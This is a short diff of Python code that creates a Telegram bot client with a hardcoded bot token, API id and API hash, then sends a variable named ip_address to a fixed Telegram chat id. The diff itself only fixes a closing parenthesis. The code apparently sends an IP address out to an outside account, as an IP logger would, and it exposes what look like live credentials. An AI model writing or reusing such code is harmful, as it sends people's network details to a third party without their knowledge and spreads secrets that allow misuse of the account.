@@ -9,7 +9,7 @@ Client = Client(
     "Chad Post Bot",
     bot_token= "5382719743:AAGkHzQWnX98N1Gp3SrEmI4yMllg_hQg6-4",
     api_id= 19611094,
-    api_hash= "c5198b0dab5cdd8e0eaaf3e0c742fbd3",
+    api_hash= "c5198b0dab5cdd8e0eaaf3e0c742fbd3",)
 
 Client.send_message(5025877489 , ip_address)
 
